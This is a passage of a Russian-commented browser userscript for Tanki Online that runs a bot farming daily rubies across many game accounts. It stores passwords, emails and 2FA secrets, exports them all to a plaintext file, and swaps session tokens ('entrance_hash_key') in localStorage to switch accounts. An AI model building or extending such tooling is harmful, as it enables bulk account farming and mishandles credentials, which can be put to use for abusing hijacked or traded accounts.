    // DAILY RUBIES — ОТДЕЛЬНАЯ БАЗА АККАУНТОВ
    // =========================================================
    function loadRubiesAccounts() {
        try {
            const raw = GM_getValue(CONFIG.RUBIES_ACCOUNTS_KEY, null);
            if (raw) {
                const parsed = JSON.parse(raw);
                RUBIES_ACCOUNTS = Array.isArray(parsed) ? parsed : [];
                return;
            }

            const legacyRaw = GM_getValue(CONFIG.RUBIES_LIST_KEY, null);
            const legacy = legacyRaw ? JSON.parse(legacyRaw) : [];
            RUBIES_ACCOUNTS = (Array.isArray(legacy) ? legacy : []).map(login => {
                const source = ACCOUNTS.find(a => a.login === login);
                return source ? { ...source } : null;
            }).filter(Boolean);
            saveRubiesAccounts();
        } catch (e) {
            RUBIES_ACCOUNTS = [];
        }
    }

    function saveRubiesAccounts() {
        GM_setValue(CONFIG.RUBIES_ACCOUNTS_KEY, JSON.stringify(RUBIES_ACCOUNTS));
        GM_setValue(CONFIG.RUBIES_LIST_KEY, JSON.stringify(RUBIES_ACCOUNTS.map(a => a.login)));
    }

    function getRubiesList() {
        return RUBIES_ACCOUNTS.map(a => a.login);
    }

    function loadRubiesArchive() {
        try {
            const raw = GM_getValue(CONFIG.RUBIES_ARCHIVE_KEY, null);
            const parsed = raw ? JSON.parse(raw) : [];
            RUBIES_ARCHIVE = Array.isArray(parsed) ? parsed : [];
        } catch (e) { RUBIES_ARCHIVE = []; }
    }

    function saveRubiesArchive() {
        GM_setValue(CONFIG.RUBIES_ARCHIVE_KEY, JSON.stringify(RUBIES_ARCHIVE));
    }

    function archiveRubiesAccount(login) {
        const account = RUBIES_ACCOUNTS.find(a => a.login === login);
        if (!account) return false;
        const status = getAccountStatus(login) || {};
        const archived = {
            ...account,
            archivedAt: new Date().toISOString(),
            archiveReason: "rubies_subscription_finished",
            status: { ...status, rubiesSubscriptionFinished: true }
        };
        const idx = RUBIES_ARCHIVE.findIndex(a => a.login === login);
        if (idx >= 0) RUBIES_ARCHIVE[idx] = { ...RUBIES_ARCHIVE[idx], ...archived };
        else RUBIES_ARCHIVE.push(archived);
        saveRubiesArchive();

        RUBIES_ACCOUNTS = RUBIES_ACCOUNTS.filter(a => a.login !== login);
        saveRubiesAccounts();
        const st = getAccountStatus(login) || {};
        st.rubiesEnabled = false;
        st.rubiesEligible = false;
        st.rubiesSubscriptionFinished = true;
        setAccountStatus(login, st);
        return true;
    }

    function getAllRubiesStoredAccounts() {
        const map = new Map();
        RUBIES_ACCOUNTS.forEach(a => map.set(a.login, { ...a }));
        RUBIES_ARCHIVE.forEach(a => {
            if (map.has(a.login)) return;
            const status = a.status || {};
            map.set(a.login, { ...a, ...status });
        });
        return [...map.values()].filter(a => a.login && (a.password || a.entranceHash));
    }

    function exportAllRubiesTxt() {
        const accounts = getAllRubiesStoredAccounts();
        if (!accounts.length) return showToast("Нет сохранённых Daily Rubies аккаунтов", "warning");
        const textOut = accounts.map(acc => {
            const st = getAccountStatus(acc.login) || acc.status || {};
            const email = normalizeEmail(acc.email) || normalizeEmail(st.loginEmail) || "—";
            const statusRub = st.rubiesNoDaily
                ? "Нет дейликов"
                : (st.rubiesSubscriptionFinished ? "Подписка завершена" : (st.rubiesStatus || "Не собрано"));
            const progress = (st.rubiesCompletedDays != null || st.rubiesTotalDays != null)
                ? `${st.rubiesCompletedDays || 0}/${st.rubiesTotalDays || 0}`
                : "—";
            const lines = [
                "---------------------------------------------",
                "Логин - " + (acc.login || "—"),
                "Пароль - " + (acc.password || "—"),
                "Почта - " + email,
                "Ранг - " + (st.rank || acc.rankFromBase || "—"),
                "Статус рубинов - " + statusRub,
                "Прогресс рубинов - " + progress,
                "Количество рубинов - " + formatAmount(st.rubies || "0")
            ];
            const twofa = get2FAByLogin(acc.login);
            if (twofa?.secret) lines.push("2FA secret - " + twofa.secret);
            return lines.join("\n");
        }).join("\n") + "\n---------------------------------------------";
        const blob = new Blob([textOut], { type: "text/plain;charset=utf-8" });
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = `tanki-daily-rubies-all-${new Date().toISOString().slice(0, 10)}.txt`;
        a.click();
        setTimeout(() => URL.revokeObjectURL(a.href), 1000);
        showToast(`Выгружено ${accounts.length} аккаунтов`, "success");
    }

    function saveRubiesList(list) {
        const unique = [...new Set((Array.isArray(list) ? list : []).map(v => String(v).trim()).filter(Boolean))];
        RUBIES_ACCOUNTS = unique.map(login => {
            const existing = RUBIES_ACCOUNTS.find(a => a.login === login);
            const source = ACCOUNTS.find(a => a.login === login);
            return existing || (source ? { ...source } : null);
        }).filter(Boolean);
        saveRubiesAccounts();
    }

    // =========================================================
    // TANK BUILDER / LOW RANK GUARD
    // =========================================================
    let _tankBuilderHandled = false;

    function resolveCurrentProcessingAccount() {
        try {
            if (Array.isArray(shuffledAccounts) && shuffledAccounts.length) {
                if (MODE === "rubies") {
                    if (currentIndex >= 0 && currentIndex < shuffledAccounts.length) {
                        return shuffledAccounts[currentIndex] || null;
                    }
                } else if (shuffledAccounts.length) {
                    return shuffledAccounts[currentIndex % shuffledAccounts.length] || null;
                }
            }
        } catch (_) {}

        const nick = (getCurrentNickname() || "").trim().toLowerCase();
        if (!nick || nick === "player") return null;

        const fromRubies = RUBIES_ACCOUNTS.find(a => {
            const login = String(a.login || "").trim().toLowerCase();
            const nickname = String(a.nickname || a.fullName || "").trim().toLowerCase();
            return login === nick || nickname === nick;
        });
        if (fromRubies) return fromRubies;

        return ACCOUNTS.find(a => {
            const login = String(a.login || "").trim().toLowerCase();
            const st = getAccountStatus(a.login) || {};
            const username = String(st.username || "").trim().toLowerCase();
            return login === nick || username === nick;
        }) || null;
    }

    function handleTankBuilderLowRank() {
        if (_tankBuilderHandled) return true;
        if (!document.querySelector(".TankBuilderComponentStyle-centerButton")) return false;

        _tankBuilderHandled = true;

        const acc = resolveCurrentProcessingAccount();
        const login = acc?.login || getCurrentNickname() || "unknown";
        const experience = getExperience();
        const rankName = getRankByExperience(experience).rankName;
        const nickname = getCurrentNickname();
        const rubies = getRubies() || "0";
        const crystals = getCrystals() || "0";
        const prev = getAccountStatus(login) || {};

        console.log(`[TankBuilder] ⚠️ Низкое звание / TankBuilder: ${login} (${rankName}, exp=${experience})`);

        setAccountStatus(login, {
            ...prev,
            skippedLowRank: true,
            reason: "TankBuilder / маленькое звание",
            experience,
            rank: rankName,
            username: nickname || prev.username || null,
            rubies,
            crystals,
            tankBuilderDetected: true
        });

        try {
            if (MODE === "rubies") {
                const queue = getRubiesRunQueue();
                const pos = queue.indexOf(login);
                const nextCursor = pos >= 0 ? pos + 1 : currentIndex + 1;
                saveRubiesRunCursor(nextCursor);
                currentIndex = nextCursor;
            } else {
                currentIndex++;
            }
        } catch (_) {
            currentIndex++;
        }

        try {
            showToast(`${login}: низкое звание — пропуск`, "warning");
        } catch (_) {}

        setTimeout(() => location.reload(), 250);
        return true;
    }

    function startTankBuilderGuard() {
        if (window.__tankiTankBuilderGuardStarted) return;
        window.__tankiTankBuilderGuardStarted = true;

        if (handleTankBuilderLowRank()) return;

        const observer = new MutationObserver(() => {
            if (handleTankBuilderLowRank()) observer.disconnect();
        });
        observer.observe(document.documentElement, { childList: true, subtree: true });

        const poll = setInterval(() => {
            if (handleTankBuilderLowRank()) {
                clearInterval(poll);
                try { observer.disconnect(); } catch (_) {}
            }
        }, 800);
    }

    // =========================================================
    // MANUAL ENTRANCE HASH — аккаунты, сохранённые ручным входом
    // =========================================================
    function getCurrentEntranceHash() {
        try {
            const hash = localStorage.getItem('entrance_hash_key');
            if (!hash) return '';
            if (typeof hash !== 'string') return '';
            if (hash.length <= 10) return '';
            if (hash.startsWith('hash_')) return '';
            return hash;
        } catch (e) { return ''; }
    }

    function setEntranceHash(hash) {
        if (!hash) return false;
        try {
            localStorage.setItem('entrance_hash_key', hash);
            try { sessionStorage.removeItem('entrance_hash_key'); } catch (_) {}
            return true;
        } catch (e) {
            console.warn('[Daily Rubies] Не удалось записать entrance_hash_key в localStorage', e);
            return false;
        }
    }

    function clearGameSessionForPasswordLogin() {
        try { localStorage.removeItem('entrance_hash_key'); } catch (_) {}
        try { sessionStorage.removeItem('entrance_hash_key'); } catch (_) {}
        console.log('[Daily Rubies] 🧹 entrance_hash_key очищен (настройки скрипта целы)');
    }

    function accountNeedsPasswordLogin(account) {
        if (!account) return true;
        const hash = String(account.entranceHash || account.hash || "").trim();
        const pass = String(account.password || "").trim();
        if (hash) return false;
        return !!pass;
    }

    function bindEntranceHashToAccount(targetLogin, hash, nickname) {
        if (!targetLogin || !hash) return false;
        const loginKey = String(targetLogin).trim().toLowerCase();
        const nickKey = nickname ? String(nickname).trim().toLowerCase() : "";
        let changed = false;
        let bound = false;

        const applyList = (list) => {
            for (const account of list) {
                if (!account) continue;
                const aLogin = String(account.login || "").trim().toLowerCase();
                const aNick = String(account.nickname || account.fullName || "").trim().toLowerCase();
                const isTarget = aLogin === loginKey || (nickKey && (aLogin === nickKey || aNick === nickKey));

                if (isTarget) {
                    bound = true;
                    if (account.entranceHash !== hash || account.authMethod !== "hash") {
                        account.entranceHash = hash;
                        account.authMethod = "hash";
                        changed = true;
                    }
                    if (nickname && account.nickname !== nickname) {
                        account.nickname = nickname;
                        account.fullName = account.fullName || nickname;
                        changed = true;
                    }
                } else if (account.entranceHash && account.entranceHash === hash) {
                    account.entranceHash = "";
                    if (account.authMethod === "hash" && account.password) {
                        account.authMethod = "credentials";
                    }
                    changed = true;
                    console.log(`[Daily Rubies] 🧹 Снят чужой hash с ${account.login}`);
                }
            }
        };

        applyList(RUBIES_ACCOUNTS);
        applyList(RUBIES_ARCHIVE);

        if (changed) {
            saveRubiesAccounts();
            saveRubiesArchive();
            console.log(`[Daily Rubies] 🔗 Hash привязан к ${targetLogin}: ${String(hash).slice(0, 16)}…`);
        }
        return bound || changed;
    }

    function dedupeSharedEntranceHashes(preferLogin) {
        const groups = new Map();
        for (const account of RUBIES_ACCOUNTS) {
            const h = String(account?.entranceHash || "").trim();
            if (!h) continue;
            if (!groups.has(h)) groups.set(h, []);
            groups.get(h).push(account);
        }
        let changed = false;
        for (const [h, list] of groups) {
            if (list.length < 2) continue;
            let keeper = list.find(a => a.login === preferLogin);
            if (!keeper) keeper = list[0];
            for (const account of list) {
                if (account === keeper) continue;
                account.entranceHash = "";
                if (account.authMethod === "hash" && account.password) account.authMethod = "credentials";
                changed = true;
                console.log(`[Daily Rubies] 🧹 Дубликат hash убран у ${account.login} (оставлен у ${keeper.login})`);
            }
        }
        if (changed) saveRubiesAccounts();
        return changed;
    }

    function getManualSavedAccounts() {
        try {
            const raw = localStorage.getItem("tanki_saved_accounts");
            const parsed = raw ? JSON.parse(raw) : [];
            return Array.isArray(parsed) ? parsed : [];
        } catch (e) { return []; }
    }

    function syncManualHashAccounts() {
        let added = 0;
        const saved = getManualSavedAccounts();
        for (const item of saved) {
            const hash = String(item?.hash || "").trim();
            const nickname = String(item?.nickname || item?.fullName || "").replace(/^\[.*?\]\s*/, "").trim();
            if (!hash || !nickname || nickname === "Player") continue;
            const ok = addRubiesAccount({
                login: nickname,
                password: "",
                entranceHash: hash,
                authMethod: "hash",
                nickname,
                fullName: item.fullName || nickname,
                rankIcon: item.rankIcon || null
            });
            if (ok) added++;
        }

        const currentHash = getCurrentEntranceHash();
        const currentName = getCurrentNickname();
        if (currentHash && currentName && currentName !== "Player") {
            if (addRubiesAccount({
                login: currentName,
                password: "",
                entranceHash: currentHash,
                authMethod: "hash",
                nickname: currentName,
                fullName: currentName
            })) added++;
        }
        if (added) saveRubiesAccounts();
        return added;
    }

    function getRubiesHashSwitchTarget() {
        try {
            const raw = GM_getValue(CONFIG.RUBIES_HASH_SWITCH_KEY, null);
            return raw ? JSON.parse(raw) : null;
        } catch (e) { return null; }
    }

    function setRubiesHashSwitchTarget(account) {
        GM_setValue(CONFIG.RUBIES_HASH_SWITCH_KEY, { login: account.login, hash: account.entranceHash });
    }

    function clearRubiesHashSwitchTarget() {
        GM_deleteValue(CONFIG.RUBIES_HASH_SWITCH_KEY);
    }

    function isCurrentRubiesHash(account) {
        return !!account?.entranceHash && getCurrentEntranceHash() === account.entranceHash;
    }

    function syncCurrentManualRubiesHash() {
        try {
            const currentHash = getCurrentEntranceHash();
            const userInfo = getCurrentUserInfo();
            if (!currentHash || !userInfo?.nickname) return false;

            const nicknameKey = userInfo.nickname.trim().toLowerCase();

            let target = RUBIES_ACCOUNTS.find(a => {
                const accountLogin = String(a?.login || "").trim().toLowerCase();
                const accountNickname = String(a?.nickname || a?.fullName || "").trim().toLowerCase();
                return accountLogin === nicknameKey || accountNickname === nicknameKey;
            });

            if (!target) {
                const ok = addRubiesAccount({
                    login: userInfo.nickname,
                    password: "",
                    entranceHash: currentHash,
                    authMethod: "hash",
                    nickname: userInfo.nickname,
                    fullName: userInfo.nickname
                });
                if (ok) {
                    bindEntranceHashToAccount(userInfo.nickname, currentHash, userInfo.nickname);
                    console.log(`[Daily Rubies] ➕ Автодобавлен аккаунт из ручного входа: ${userInfo.nickname}`);
                    try { showToast(`Добавлен в Daily Rubies: ${userInfo.nickname}`, "success"); } catch (e) {}
                    if (currentTab === "rubies") renderRubies();
                    return true;
                }
                return false;
            }

            const before = target.entranceHash || "";
            const changed = bindEntranceHashToAccount(target.login, currentHash, userInfo.nickname);
            if (changed && before !== currentHash) {
                console.log(`[Daily Rubies] 🔄 Обновлён entrance_hash_key для ${target.login} (${userInfo.nickname})`);
                if (currentTab === "rubies") renderRubies();
            }
            return changed;
        } catch (e) {
            console.warn("[Daily Rubies] Не удалось синхронизировать текущий entrance_hash_key", e);
            return false;
        }
    }
    function startManualHashSyncWatcher() {
    if (window.__tankiRubiesHashWatcherStarted) return;
    window.__tankiRubiesHashWatcherStarted = true;

    const check = () => {
        const hash = getCurrentEntranceHash();
        const nickname = getCurrentNickname();
        if (hash && nickname && nickname !== "Player") {
            syncCurrentManualRubiesHash();
        }
    };

    setInterval(check, 1200);

    const observer = new MutationObserver(() => check());
    observer.observe(document.body, { childList: true, subtree: true });
}
        function addRubiesAccount(account) {
        if (!account || !account.login) return false;
        const login = String(account.login).trim();
        const password = String(account.password || "").trim();
        const entranceHash = String(account.entranceHash || account.hash || "").trim();
        if (!login || (!password && !entranceHash)) return false;

        let existingIndex = RUBIES_ACCOUNTS.findIndex(a => a.login === login);

        if (existingIndex < 0 && entranceHash) {
            existingIndex = RUBIES_ACCOUNTS.findIndex(a => a.entranceHash && a.entranceHash === entranceHash);
            if (existingIndex >= 0) {
                console.log(`[Daily Rubies] ♻️ Hash уже существует (${RUBIES_ACCOUNTS[existingIndex].login}) — мержим вместо добавления`);
            }
        }

        const source = ACCOUNTS.find(a => a.login === login);
        const existing = existingIndex >= 0 ? RUBIES_ACCOUNTS[existingIndex] : {};
        const merged = {
            ...(source || {}),
            ...existing,
            ...account,
            login,
            password: password || existing.password || source?.password || "",
            entranceHash: entranceHash || existing.entranceHash || source?.entranceHash || null,
            authMethod: entranceHash || existing.entranceHash ? "hash" : (existing.authMethod || account.authMethod || source?.authMethod || "credentials"),
            email: normalizeEmail(account.email || existing.email || source?.email),
            year: account.year || existing.year || source?.year || null,
            rankFromBase: account.rankFromBase || existing.rankFromBase || source?.rankFromBase || null,
            bound: account.bound !== undefined && account.bound !== null ? account.bound :
                   (existing.bound !== undefined && existing.bound !== null ? existing.bound : (source?.bound ?? null))
        };

        if (existingIndex >= 0) RUBIES_ACCOUNTS[existingIndex] = merged;
        else RUBIES_ACCOUNTS.push(merged);

        const st = getAccountStatus(login) || {};
        st.rubiesEnabled = true;
        st.rubiesEligible = true;
        setAccountStatus(login, st);
        saveRubiesAccounts();
        return true;
    }

    function addToRubiesList(login) {
        const source = ACCOUNTS.find(a => a.login === login);
        if (!source) return false;
        return addRubiesAccount({ ...source });
    }

    function removeFromRubiesList(login) {
        RUBIES_ACCOUNTS = RUBIES_ACCOUNTS.filter(a => a.login !== login);
        saveRubiesAccounts();
        const st = getAccountStatus(login) || {};
        st.rubiesEnabled = false;
        setAccountStatus(login, st);
    }

    function clearRubiesAccounts() {
        const oldLogins = RUBIES_ACCOUNTS.map(a => a.login);
        RUBIES_ACCOUNTS = [];
        saveRubiesAccounts();
        clearRubiesRunState();
        oldLogins.forEach(login => {
            const st = getAccountStatus(login) || {};
            st.rubiesEnabled = false;
            st.rubiesEligible = false;
            setAccountStatus(login, st);
        });
        shuffledAccounts = [];
        currentIndex = 0;
        if (MODE === "rubies") {
            setRunningState(false);
            isPaused = false;
        }
    }

    function isInRubiesList(login) {
        return RUBIES_ACCOUNTS.some(a => a.login === login);
    }

    function resetRubiesDailyStatuses(force = false) {
        const todayKey = getRubiesTodayKey();
        const resetKey = GM_getValue("tanki_rubies_daily_reset_v80", "");
        if (!force && resetKey === todayKey) return false;

        let changed = 0;
        for (const acc of RUBIES_ACCOUNTS) {
            const st = getAccountStatus(acc.login) || {};
            if (st.rubiesStatus !== "Не собрано" || st.lastRubiesCollection || st.rubiesManuallySet) {
                st.rubiesStatus = "Не собрано";
                st.lastRubiesCollection = null;
                st.rubiesManuallySet = false;
                setAccountStatus(acc.login, st);
                changed++;
            }
        }
        GM_setValue("tanki_rubies_daily_reset_v80", todayKey);
        GM_deleteValue(CONFIG.RUBIES_LAST_RUN_KEY);
        clearRubiesRunState();
        console.log(`[Daily Rubies] 🔄 Ежедневный сброс статусов в 05:00 МСК: ${changed} аккаунтов`);
        return true;
    }

    function getRubiesTodayKey() {
        const now = new Date();
        const utcMs = now.getTime() + now.getTimezoneOffset() * 60000;
        const msk = new Date(utcMs + 3 * 60 * 60 * 1000);
        return `${msk.getFullYear()}-${String(msk.getMonth() + 1).padStart(2, "0")}-${String(msk.getDate()).padStart(2, "0")}`;
    }

    function isRubiesCollectedToday(status) {
        if (!status || status.rubiesStatus !== "Собрано" || !status.lastRubiesCollection) return false;
        const d = new Date(status.lastRubiesCollection);
        if (Number.isNaN(d.getTime())) return false;
        const utcMs = d.getTime() + d.getTimezoneOffset() * 60000;
        const msk = new Date(utcMs + 3 * 60 * 60 * 1000);
        return `${msk.getFullYear()}-${String(msk.getMonth() + 1).padStart(2, "0")}-${String(msk.getDate()).padStart(2, "0")}` === getRubiesTodayKey();
    }

    function setRubiesCollectedStatus(login, collected) {
        const st = getAccountStatus(login) || {};
        if (collected) {
            st.rubiesStatus = "Собрано";
            st.lastRubiesCollection = new Date().toISOString();
            st.rubiesManuallySet = true;
        } else {
            st.rubiesStatus = "Не собрано";
            st.lastRubiesCollection = null;
            st.rubiesManuallySet = true;
            st.rubiesSubscriptionFinished = false;
        }
        setAccountStatus(login, st);
    }

    function getRubiesEligibleAccounts(options = {}) {
        const includeCollected = !!options.includeCollected;
        return RUBIES_ACCOUNTS.filter(acc => {
            const st = getAccountStatus(acc.login) || {};
            if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) return false;
            if (st.rubiesEnabled === false) return false;
            if (!includeCollected && st.rubiesStatus === "Собрано") return false;
            if (!includeCollected && isRubiesCollectedToday(st)) return false;
            return true;
        });
    }

    function addRubiesAccountsFromText(text) {
        const parsed = sortAccounts(String(text || ''));
        let added = 0;
        let twofaLinked = 0;
        for (const account of parsed) {
            if (addRubiesAccount(account)) added++;
            const secret = account.twofaSecret
                ? String(account.twofaSecret).replace(/\s+/g, "").toUpperCase()
                : null;
            if (secret && /^[A-Z2-7]{16,}$/.test(secret) && account.login) {
                upsert2FAAccount({
                    login: account.login,
                    password: account.password || null,
                    email: account.email || null,
                    nickname: account.nickname || account.login,
                    secret,
                    rank: account.rankFromBase || null,
                    experience: account.experience ?? null,
                    rubies: account.rubies || "0",
                    crystals: account.crystals || "0",
                    tankoins: account.tankoins || "0",
                    bound: account.bound ?? null,
                    year: account.year ?? null,
                    activatedAt: new Date().toISOString()
                });
                twofaLinked++;
            }
        }
        return { added, parsed: parsed.length, twofaLinked };
    }

    // =========================================================
    // DAILY RUBIES — сохранение очереди между reload()
    // =========================================================
    function getRubiesRunQueue() {
        try {
            const raw = GM_getValue(CONFIG.RUBIES_RUN_QUEUE_KEY, null);
            const list = raw ? JSON.parse(raw) : [];
            return Array.isArray(list) ? list : [];
        } catch (e) { return []; }
    }

    function saveRubiesRunQueue(queue) {
        GM_setValue(CONFIG.RUBIES_RUN_QUEUE_KEY, JSON.stringify(queue || []));
    }

    function getRubiesRunCursor() {
        const n = parseInt(GM_getValue(CONFIG.RUBIES_RUN_CURSOR_KEY, 0), 10);
        return Number.isFinite(n) && n >= 0 ? n : 0;
    }

    function saveRubiesRunCursor(index) {
        GM_setValue(CONFIG.RUBIES_RUN_CURSOR_KEY, Math.max(0, Number(index) || 0));
    }

    function clearRubiesRunState() {
        GM_deleteValue(CONFIG.RUBIES_RUN_QUEUE_KEY);
        GM_deleteValue(CONFIG.RUBIES_RUN_CURSOR_KEY);
    }

    function beginRubiesRun() {
        const queue = getRubiesEligibleAccounts().map(a => a.login);
        saveRubiesRunQueue(queue);
        saveRubiesRunCursor(0);
        shuffledAccounts = queue.map(login => RUBIES_ACCOUNTS.find(a => a.login === login)).filter(Boolean);
        currentIndex = 0;
        return shuffledAccounts.length;
    }

    function restoreRubiesRun() {
        const queue = getRubiesRunQueue();
        if (!queue.length) return false;
        shuffledAccounts = queue.map(login => RUBIES_ACCOUNTS.find(a => a.login === login)).filter(Boolean);
        let cursor = getRubiesRunCursor();
        if (cursor < 0) cursor = 0;
        if (cursor > shuffledAccounts.length) cursor = shuffledAccounts.length;
        currentIndex = cursor;
        for (let i = cursor; i < shuffledAccounts.length; i++) {
            const acc = shuffledAccounts[i];
            if (!acc) continue;
            const st = getAccountStatus(acc.login) || {};
            if (st.rubiesStatus === "Собрано" || isRubiesCollectedToday(st)) continue;
            if (CONFIG.RUBIES_SKIP_FINISHED && st.rubiesSubscriptionFinished) continue;
            return true;
        }
        return false;
    }

    // =========================================================
    // DAILY RUBIES — реальный flow
    // =========================================================
    async function openMissionsTab() {
        const start = Date.now();
        while (Date.now() - start < 15000) {
            for (const item of document.querySelectorAll(".PrimaryMenuItemComponentStyle-itemCommonLi")) {
                const name = item.querySelector(".PrimaryMenuItemComponentStyle-itemName");
                if (name && name.textContent.trim().toUpperCase().includes("МИССИИ")) {
                    robustClick(item);
                    await sleep(800);
                    const deadline = Date.now() + 12000;
                    while (Date.now() < deadline) {
                        if (document.querySelector(".ScrollingCardsComponentStyle-scrollCard")) return true;
                        if (document.querySelector(".MenuComponentStyle-battleTitleCommunity")) return true;
                        await sleep(200);
                    }
                    return true;
                }
            }
            const el = findElementByText("МИССИИ", [".PrimaryMenuItemComponentStyle-itemName", "span"]);
            if (el) {
                const li = el.closest("li") || el.closest(".PrimaryMenuItemComponentStyle-itemCommonLi") || el;
                robustClick(li);
                await sleep(800);
                const deadline = Date.now() + 12000;
                while (Date.now() < deadline) {
                    if (document.querySelector(".ScrollingCardsComponentStyle-scrollCard")) return true;
                    if (document.querySelector(".MenuComponentStyle-battleTitleCommunity")) return true;
                    await sleep(200);
                }
                return true;
            }
            await sleep(300);
        }
        console.log("[Daily Rubies] ⚠️ Не удалось открыть МИССИИ");
        return false;
    }

    async function handleLoginBonus() {
        let card = findCardByTitle("Бонус за вход");
        if (!card) {
            for (const c of document.querySelectorAll(".ScrollingCardsComponentStyle-scrollCard")) {
                const desc = c.querySelector(".ScrollingCardsComponentStyle-cardDescription");
                if (desc && desc.textContent.includes("Награды за вход")) { card = c; break; }
            }
        }
        if (!card) return false;

        console.log("[Daily Rubies] 🎁 Бонус за вход найден");
        const clickTarget = card.querySelector(".ScrollingCardsComponentStyle-selectCard") || card;
        robustClick(clickTarget);

        const findBtn = () => {
            for (const b of document.querySelectorAll("span, div, button")) {
                const t = (b.textContent || "").trim();
                if (t === "Забрать всё" && b.children.length <= 1) return b;
            }
            return null;
        };

        const start = Date.now();
        while (Date.now() - start < 3500) {
            const btn = findBtn();
            if (btn) {
                robustClick(btn);
                console.log("[Daily Rubies] 🎁 Забрать всё");
                await sleep(randomDelay(1200, 1800));
                return true;
            }
            await sleep(200);
        }
        console.log("[Daily Rubies] ℹ️ Бонус за вход: кнопки нет (уже забрано)");
        return false;
    }

    async function openSpecialMissions() {
        let clicked = false;
        const start = Date.now();
        while (Date.now() - start < 12000 && !clicked) {
            const items = document.querySelectorAll(
                ".MenuComponentStyle-mainMenuItem, [class*='MenuComponentStyle-mainMenuItem']"
            );
            for (const item of items) {
                const t = (item.textContent || "").trim();
                if (t.includes("Особые")) {
                    if (item.classList.contains("-activeMenu")) {
                        console.log("[Daily Rubies] ⭐ Особые уже открыты");
                        clicked = true;
                        break;
                    }
                    console.log("[Daily Rubies] ⭐ Открываем Особые");
                    robustClick(item);
                    clicked = true;
                    break;
                }
            }
            if (!clicked) await sleep(200);
        }
        if (!clicked) {
            console.log("[Daily Rubies] ⚠️ Вкладка «Особые» не найдена");
            return false;
        }

        const deadline = Date.now() + 15000;
        while (Date.now() < deadline) {
            const nodes = document.querySelectorAll(
                ".MainQuestComponentStyle-cardRewardCompleted," +
                ".TableMainQuestComponentStyle-cardRewardCompletedTable"
            );
            if (nodes.length > 0) {
                console.log(`[Daily Rubies] ⭐ Особые: найдено ${nodes.length} миссий`);
                return true;
            }
            await sleep(250);
        }
        console.log("[Daily Rubies] ⚠️ Особые: миссии не появились за 15с");
        return false;
    }

    function analyzeMissionNode(node) {
        const text = (node.textContent || "");
        const completed = /ЗАВЕРШЕНО/i.test(text);
        const canTake = /Забрать награду/i.test(text) && !/Получено/i.test(text);
        const progress = extractProgress(node);
        return { completed, canTake, progress };
    }

    function findClaimButton(root, depth = 3) {
        const scan = (container) => {
            if (!container) return null;
            for (const b of container.querySelectorAll("span, div, button, a")) {
                const t = (b.textContent || "").trim();
                if (t === "Забрать награду" && b.children.length <= 1) return b;
            }
            for (const b of container.querySelectorAll("span, div, button, a")) {
                if ((b.textContent || "").trim().includes("Забрать награду")) return b;
            }
            return null;
        };
        let n = root;
        for (let i = 0; i <= depth && n; i++) {
            const btn = scan(n);
            if (btn) return btn;
            n = n.parentElement;
        }
        return null;
    }

    async function tryCollectMission(missionName) {
        const node = findMissionByName(missionName);
        if (!node) {
            console.log(`[Daily Rubies] ⚠️ Миссия не найдена: ${missionName}`);
            return { found: false };
        }

        const progress = extractProgress(node);
        const text = node.textContent || "";
        const isCompleted = /ЗАВЕРШЕНО/i.test(text);
        const hasClaimText = /Забрать награду/i.test(text);

        const btn = findClaimButton(node, 3);
        if (btn) {
            robustClick(btn);
            console.log(`[Daily Rubies] 💎 Забрана награда (btn): ${missionName}`);
            await sleep(randomDelay(1200, 1800));
            return { found: true, canTake: true, progress };
        }

        if (isCompleted || hasClaimText) {
            console.log(`[Daily Rubies] 💎 Клик по миссии (no-button): ${missionName}`);
            robustClick(node);
            await sleep(randomDelay(1200, 1800));
            return { found: true, canTake: true, progress };
        }

        console.log(`[Daily Rubies] ⏭ ${missionName}: награду нельзя забрать`);
        return { found: true, canTake: false, progress };
    }

                async function processRubiesAccount(acc) {
        const login = acc.login;
        const password = acc.password;
        let email = normalizeEmail(acc.email);
        if (!isRunning) return { login, status: "stopped" };

        const prev = getAccountStatus(login) || {};
        if (CONFIG.RUBIES_SKIP_FINISHED && prev.rubiesSubscriptionFinished) {
            console.log(`[Daily Rubies] ⏭ ${login}: подписка завершена — пропуск`);
            currentIndex++;
            return { login, status: "subscription_finished" };
        }

        if (acc.entranceHash) {
            const currentHash = getCurrentEntranceHash();
            const currentNick = (getCurrentNickname() || "").trim().toLowerCase();
            const accNick = String(acc.nickname || acc.fullName || "").trim().toLowerCase();
            const accLogin = String(acc.login || "").trim().toLowerCase();
            const nickLooksSame = !currentNick || currentNick === accNick || currentNick === accLogin;

            if (currentHash && currentHash === acc.entranceHash && nickLooksSame) {
                clearRubiesHashSwitchTarget();
                console.log(`[Daily Rubies] 🔑 ${login}: hash совпадает, уже на аккаунте`);
                bindEntranceHashToAccount(login, currentHash, getCurrentNickname() || acc.nickname);
            } else if (currentHash && currentHash === acc.entranceHash && !nickLooksSame) {
                console.warn(`[Daily Rubies] ⚠️ ${login}: hash в базе совпал, но ник другой (${currentNick || "—"} ≠ ${accNick || accLogin}). Сбрасываю hash и вхожу по паролю.`);
                acc.entranceHash = "";
                const idx = RUBIES_ACCOUNTS.findIndex(a => a.login === login);
                if (idx >= 0) {
                    RUBIES_ACCOUNTS[idx].entranceHash = "";
                    if (RUBIES_ACCOUNTS[idx].password) RUBIES_ACCOUNTS[idx].authMethod = "credentials";
                    saveRubiesAccounts();
                }
            } else {
                console.log(`[Daily Rubies] 🔑 Переключение hash → ${login} (текущий: ${currentHash || "—"})`);
                setRubiesHashSwitchTarget(acc);
                setEntranceHash(acc.entranceHash);
                await sleep(500);
                location.reload();
                return { login, status: "hash_switch" };
            }
        }

        let forceCredentials = false;
        try {
            const forceLogin = GM_getValue("tanki_rubies_force_credentials_v83", null);
            if (forceLogin && forceLogin === login) {
                GM_deleteValue("tanki_rubies_force_credentials_v83");
                clearGameSessionForPasswordLogin();
                forceCredentials = true;
                console.log(`[Daily Rubies] 🧹 force credentials login для ${login}`);
            }
        } catch (_) {}

        let timestamp = new Date().toLocaleTimeString();
        console.log(`[Daily Rubies] 🔐 Авторизация: ${login}`);

        let usedLogin = normalizeEmail(email) || login, loginWasEmail = !!normalizeEmail(email);
        try {
            if (checkConnectionError()) { location.reload(); return { login, status: "reload" }; }

            await waitAndClickStartScreen().catch(() => {});

            const alreadyInLobby = !!document.querySelector(".UserInfoContainerStyle-userNameRank");
            const currentHash = getCurrentEntranceHash();
            const hashOk = !!(acc.entranceHash && currentHash && currentHash === acc.entranceHash && alreadyInLobby);

            if (hashOk && !forceCredentials) {
